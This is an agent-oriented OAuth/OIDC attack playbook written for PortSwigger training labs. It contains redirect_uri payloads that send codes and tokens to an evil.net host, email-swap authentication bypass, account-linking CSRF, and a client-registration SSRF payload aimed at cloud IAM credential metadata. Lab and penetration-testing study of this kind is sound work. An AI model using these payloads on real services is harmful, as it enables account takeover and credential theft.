# OAuth 2.0 / OIDC Attacks Methodology
## Expert-Level Playbook (redirect_uri, state/CSRF, token theft, registration SSRF)

> 5 PortSwigger labs. Capture the full browser flow first, then change ONE
> parameter at a time. Most wins come from redirect_uri validation flaws, missing
> `state`, and account-linking CSRF. Use `caido_local_api`/`burp_get_proxy_history`
> to replay raw requests while preserving cookies.

---

## Phase 1: Map the flow

### 1.1 Endpoints & params
```
http_request url=https://TARGET/.well-known/openid-configuration    # OIDC discovery
```
Record: `authorization_endpoint`, `token_endpoint`, `userinfo_endpoint`,
`registration_endpoint`, `client_id`, `redirect_uri`, `scope`, `response_type`,
`state`, `nonce`. Watch whether it's implicit (`response_type=token`) or code.

### 1.2 Baseline
`browser_navigate` the normal login, capture the callback in
`burp_get_proxy_history` (code/token + redirect). This is your control.

---

## Phase 2: Attack Matrix (per sub-variant)

| Sub-variant | Flaw | Attack |
|-------------|------|--------|
| Authentication bypass via OAuth implicit | server trusts client-sent user id/email | replay token flow, swap email in the POST to `/authenticate` |
| Forced OAuth profile linking | no `state` on linking | CSRF the "link account" callback to attach your social account to victim |
| OAuth account hijack via redirect_uri | loose redirect validation | steal code/token by redirecting to attacker |
| Stealing codes/tokens via open redirect | chained open redirect in redirect_uri | `redirect_uri=.../callback?...=https://evil` |
| SSRF via OpenID dynamic client registration | registration fetches metadata URLs | point `logo_uri`/`jwks_uri` at internal metadata |

### 2.1 Implicit-flow authentication bypass
The client `POST`s `{email, token}` to its own `/authenticate`. Swap `email` to
the victim's while keeping your token → server logs you in as victim if it trusts
the client-supplied email.

### 2.2 Forced profile linking (state CSRF)
The account-linking callback lacks `state`. Start linking with YOUR social
account, capture the callback URL with the linking `code`, and CSRF-deliver it to
the victim (exploit server) so the victim's account links to your identity.
```
# csrf_get_image / csrf_autosubmit_form to the /oauth-linking?code=... callback
```

### 2.3 redirect_uri exploitation (steal code/token)
Test redirect_uri validation weaknesses:
```
redirect_uri=https://TARGET.evil.net           (suffix match)
redirect_uri=https://evil.net/TARGET           (prefix match)
redirect_uri=https://TARGET@evil.net           (userinfo confusion)
redirect_uri=https://TARGET/callback/../evil    (path normalization)
redirect_uri=https://TARGET/callback?x=https://evil   (open-redirect chain)
```
When the AS redirects the code/token to an attacker-controlled URL, capture it and
complete the flow. For implicit flow, the token in the fragment is stolen via a
page that reads `location.hash` (deliver with the exploit server).

### 2.4 Stealing via open redirect in redirect_uri
If `redirect_uri` must stay on-domain but the callback contains an open redirect,
chain them so the code is forwarded off-site with the `Referer`/param.

### 2.5 SSRF via dynamic client registration (OIDC)
```
POST /reg HTTP/1.1  (registration_endpoint)
{"redirect_uris":["https://exploit-.../"],"logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"}
```
The AS fetches `logo_uri`/`jwks_uri` server-side → SSRF to cloud metadata.
Confirm the fetch with `oob_get_domain`/`oob_poll` first, then swap to the
internal target. (See the `oauth_ssrf_dynamic_registration` playbook.)

---

## Phase 3: Tooling

```
browser_navigate / browser_execute_js   # drive + read location.hash for token theft
burp_get_proxy_history / caido_local_api # capture & replay raw OAuth requests with cookies
http_request                            # discovery, registration, token endpoint
oob_get_domain / oob_poll               # registration SSRF confirmation
exploit_server                          # host token-capture / CSRF pages
```

## Common Failure Modes & Solutions

| Problem | Solution |
|---------|----------|
| redirect_uri rejected | Try suffix/prefix/userinfo/path-normalization/open-redirect variants |
| No `state` to abuse | Confirm linking flow specifically; state is often only missing there |
| Token not captured | For implicit flow, read `location.hash` on your hosted page |
| Registration SSRF blind | Prove with OOB before targeting internal metadata |
| Flow needs login | Use supplied lab creds; keep the session cookie across replays |

## Validation / Success Criteria
- [ ] The modified flow authenticates/links the wrong account or leaks a code/token.
- [ ] A control flow with correct binding does not reproduce it.
- [ ] For SSRF: server-side fetch reaches the controlled/internal URL.
- [ ] Lab solved banner observed.
